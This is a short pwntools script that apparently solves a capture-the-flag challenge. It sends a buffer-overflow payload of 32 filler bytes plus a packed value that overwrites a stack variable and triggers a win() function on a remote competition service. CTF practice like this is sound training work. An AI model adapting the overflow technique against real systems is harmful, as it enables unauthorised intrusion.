import struct
from pwn import *

# Connect to the remote service
target = remote('codefest-ctf.iitbhu.tech', 51429)

# Address where we want to overwrite the local_14 variable to trigger the win() function
target_value = struct.pack('<I', 0x23456723)  # Little-endian format of the value to overwrite local_14

# Payload to overflow the buffer (32 bytes + value to overwrite local_14)
payload = b"A" * 32  # Fill the buffer with 32 'A's
payload += target_value  # Overwrite local_14 with 0x23456723

# Send the payload
target.sendline(payload)

# Receive and print the response
response = target.recvall()
print(response.decode())

# Close the connection
target.close()
